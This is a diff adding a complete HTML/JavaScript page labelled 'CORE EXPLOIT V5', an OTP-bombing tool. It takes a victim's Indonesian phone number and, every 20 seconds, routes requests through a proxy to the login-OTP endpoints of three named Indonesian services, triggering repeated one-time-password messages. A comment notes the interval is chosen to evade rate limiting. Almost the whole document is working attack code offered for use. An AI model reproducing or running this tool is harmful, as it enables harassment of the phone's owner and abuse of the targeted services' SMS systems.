@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP PROTOCOL V5</title>
+    <style>
+        :root { --main: #00FF41; --bg: #0a0a0a; }
+        body { background: var(--bg); color: var(--main); font-family: monospace; display: flex; justify-content: center; padding: 20px; }
+        .terminal { width: 100%; max-width: 400px; border: 2px solid var(--main); padding: 20px; box-shadow: 0 0 10px var(--main); }
+        input { width: 100%; padding: 10px; background: #111; border: 1px solid var(--main); color: var(--main); margin-bottom: 10px; outline: none; }
+        button { width: 100%; padding: 10px; background: var(--main); color: #000; border: none; font-weight: bold; cursor: pointer; margin-bottom: 5px; }
+        button:disabled { background: #333; color: #666; }
+        #log { height: 150px; overflow-y: auto; border-top: 1px solid #333; margin-top: 10px; font-size: 11px; padding-top: 10px; }
+        .green { color: var(--main); }
+        .red { color: #ff3131; }
+    </style>
+</head>
+<body>
+
+<div class="terminal">
+    <h3 style="text-align:center">CORE EXPLOIT V5</h3>
+    <hr style="border: 1px solid #333; margin: 10px 0;">
+    <input type="text" id="phone" placeholder="628xxxxxxxxxx">
+    <button id="startBtn" onclick="start()">START SESSION</button>
+    <button id="stopBtn" onclick="stop()" disabled>STOP</button>
+    
+    <div id="log">SYSTEM READY...</div>
+</div>
+
+<script>
+    let isRunning = false;
+    let timer = null;
+
+    const apiList = [
+        { name: "DuniaGames", url: "https://duniagames.co.id/api/bazaar/v1/auth/otp", body: (n) => ({ phoneNumber: n, otpType: "login" }) },
+        { name: "Rumah123", url: "https://www.rumah123.com/api/v1/user/otp", body: (n) => ({ phone: n, type: "login" }) },
+        { name: "Cermati", url: "https://www.cermati.com/api/v1/resend_otp", body: (n) => ({ phone: n, type: "login" }) }
+    ];
+
+    function writeLog(msg, type) {
+        const log = document.getElementById('log');
+        const color = type === 'success' ? 'green' : (type === 'error' ? 'red' : '');
+        log.innerHTML += `<div class="${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+        log.scrollTop = log.scrollHeight;
+    }
+
+    async function fire() {
+        if (!isRunning) return;
+        const num = document.getElementById('phone').value;
+        const api = apiList[Math.floor(Math.random() * apiList.length)];
+
+        writeLog(`ATTEMPTING: ${api.name}...`);
+
+        try {
+            // Kita menembak ke proxy internal Vercel (/api/proxy)
+            const res = await fetch('/api/proxy', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    targetUrl: api.url,
+                    body: api.body(num)
+                })
+            });
+
+            const result = await res.json();
+            if (result.success) writeLog(`DELIVERED: ${api.name}`, 'success');
+            else writeLog(`REJECTED: ${api.name}`, 'error');
+
+        } catch (e) {
+            writeLog("CONNECTION ERROR", "error");
+        }
+    }
+
+    function start() {
+        if (document.getElementById('phone').value.length < 10) return alert("Nomor tidak valid!");
+        isRunning = true;
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = false;
+        writeLog("SESSION STARTED");
+        fire();
+        timer = setInterval(fire, 20000); // 20 detik agar aman
+    }
+
+    function stop() {
+        isRunning = false;
+        clearInterval(timer);
+        document.getElementById('startBtn').disabled = false;
+        document.getElementById('stopBtn').disabled = true;
+        writeLog("SESSION TERMINATED");
+    }
+</script>
+
+</body>
+</html>
